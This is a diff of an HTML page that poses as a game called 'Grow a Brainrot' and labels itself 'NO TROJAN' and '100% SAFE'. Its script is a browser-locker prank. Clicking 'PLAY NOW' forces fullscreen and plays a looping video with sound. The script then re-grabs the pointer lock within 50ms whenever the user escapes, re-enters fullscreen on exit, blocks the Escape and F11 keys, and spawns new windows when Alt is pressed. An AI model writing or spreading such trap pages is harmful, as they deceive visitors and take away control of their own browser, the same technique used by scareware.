@@ -5,106 +5,129 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GROW A BRAINROT(NO TROJAN)</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none !important; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
-            background: #000;
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
             height: 100vh;
             display: flex; justify-content: center; align-items: center;
-            overflow: hidden; color: white;
+            overflow: hidden; color: white; font-family: 'Comic Sans MS', cursive;
         }
-        #videoOverlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: #000; z-index: 99999;
-        }
-        video { width: 100%; height: 100%; object-fit: fill; }
-        
-        /* Pre-click UI */
+
+        /* Initial UI */
         .game-card {
             background: rgba(0,0,0,0.9); border: 8px ridge #0f0; border-radius: 20px;
             padding: 2rem; text-align: center; box-shadow: 0 0 50px #f0f;
-            max-width: 450px; width: 90%;
+            max-width: 450px; width: 90%; z-index: 10;
         }
+
         .play-button {
             background: #f00; color: #fff; padding: 20px 50px; font-size: 2rem;
-            font-weight: 900; border: 4px solid #fff; border-radius: 10px; cursor: pointer;
+            font-weight: 900; border: 4px solid #fff; border-radius: 10px; 
+            cursor: pointer; animation: vibrate 0.1s infinite;
         }
+
+        /* The Trap Overlay - Hidden initially */
+        #videoOverlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #000; z-index: 99999; cursor: none !important;
+        }
+
+        video { width: 100%; height: 100%; object-fit: fill; }
+
+        @keyframes gradient { 0% {background-position:0% 50%} 50% {background-position:100% 50%} 100% {background-position:0% 50%} }
+        @keyframes vibrate { 0% {transform:translate(0)} 20% {transform:translate(-2px,2px)} 40% {transform:translate(-2px,-2px)} 100% {transform:translate(0)} }
     </style>
 </head>
 <body>
 
     <div class="game-card" id="mainCard">
-        <h1 style="margin-bottom:20px;">GROW A BRAINROT</h1>
-        <img src="https://i.imgur.com/Ohxn6Lc.jpeg" style="width:100%; border-radius:10px; margin-bottom:20px;">
-        <button onclick="lockJail()" class="play-button">PLAY NOW</button>
+        <h1 style="margin-bottom:20px; text-shadow: 2px 2px #f00;">GROW A BRAINROT</h1>
+        <img src="https://i.imgur.com/Ohxn6Lc.jpeg" style="width:100%; border-radius:10px; margin-bottom:20px; border: 3px solid #fff;">
+        <button onclick="ignite()" class="play-button">PLAY NOW</button>
+        <p style="margin-top:15px; color:yellow;">NO VIRUS - 100% SAFE</p>
     </div>
 
     <div id="videoOverlay">
-        <video id="v" loop playsinline>
+        <video id="rickroll" loop playsinline>
             <source src="video.mp4" type="video/mp4">
         </video>
     </div>
 
     <script>
         const overlay = document.getElementById('videoOverlay');
-        const video = document.getElementById('v');
+        const video = document.getElementById('rickroll');
         const card = document.getElementById('mainCard');
+        let isTrapActive = false;
 
-        function lockJail() {
-            // 1. Show Video
+        function ignite() {
+            // 1. Switch UI
             card.style.display = 'none';
             overlay.style.display = 'block';
+            
+            // 2. Activate Trap State
+            isTrapActive = true;
+
+            // 3. Start Video with Sound
             video.muted = false;
             video.play();
 
-            // 2. Force Fullscreen
+            // 4. Force Fullscreen
             if (overlay.requestFullscreen) {
                 overlay.requestFullscreen();
             } else if (overlay.webkitRequestFullscreen) {
                 overlay.webkitRequestFullscreen();
             }
 
-            // 3. THE ACTUAL LOCK: Pointer Lock API
-            requestLock();
+            // 5. Initial Mouse Lock
+            requestMouseLock();
         }
 
-        function requestLock() {
-            overlay.requestPointerLock = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
-            overlay.requestPointerLock();
-        }
-
-        // IF THEY TRY TO UNLOCK (Escape mouse), FORCE IT BACK INSTANTLY
-        document.addEventListener('pointerlockchange', lockChangeAlert, false);
-        document.addEventListener('webkitpointerlockchange', lockChangeAlert, false);
-
-        function lockChangeAlert() {
-            if (document.pointerLockElement !== overlay && document.webkitPointerLockElement !== overlay) {
-                // User escaped! Force them back after 50ms
-                setTimeout(() => {
-                    requestLock();
-                }, 50);
+        function requestMouseLock() {
+            if (!isTrapActive) return; // Don't lock if video isn't running
+            
+            const lockMethod = overlay.requestPointerLock || overlay.webkitRequestPointerLock;
+            if (lockMethod) {
+                lockMethod.call(overlay);
             }
         }
 
-        // BLOCK EXIT KEYS
+        // NO ESCAPE: Re-lock if they try to leave
+        document.addEventListener('pointerlockchange', () => {
+            if (isTrapActive && document.pointerLockElement !== overlay) {
+                setTimeout(requestMouseLock, 50); // Force back in 50ms
+            }
+        }, false);
+
+        document.addEventListener('fullscreenchange', () => {
+            if (isTrapActive && !document.fullscreenElement) {
+                ignite(); // Force back to fullscreen
+            }
+        });
+
+        // ALT + KEYBOARD TRAP
         window.addEventListener("keydown", (e) => {
+            if (!isTrapActive) return;
+
             if (e.key === "Escape" || e.key === "F11") {
                 e.preventDefault();
-                requestLock(); // Re-lock on key press
+                requestMouseLock();
             }
+
             if (e.altKey) {
+                e.preventDefault();
+                // Spawn a backup rickroll window if they try to Alt-Tab
                 window.open(window.location.href, '_blank', 'width=500,height=500');
             }
         });
 
-        // Re-lock if they click anywhere
-        document.addEventListener('mousedown', requestLock);
-        
-        // Final fallback: If they move the mouse at all, try to grab it
-        overlay.addEventListener('mousemove', () => {
-            if (!document.pointerLockElement) {
-                requestLock();
-            }
+        // Ensure clicking anywhere re-grabs the mouse
+        document.addEventListener('mousedown', () => {
+            if (isTrapActive) requestMouseLock();
         });
+
     </script>
 </body>
 </html>
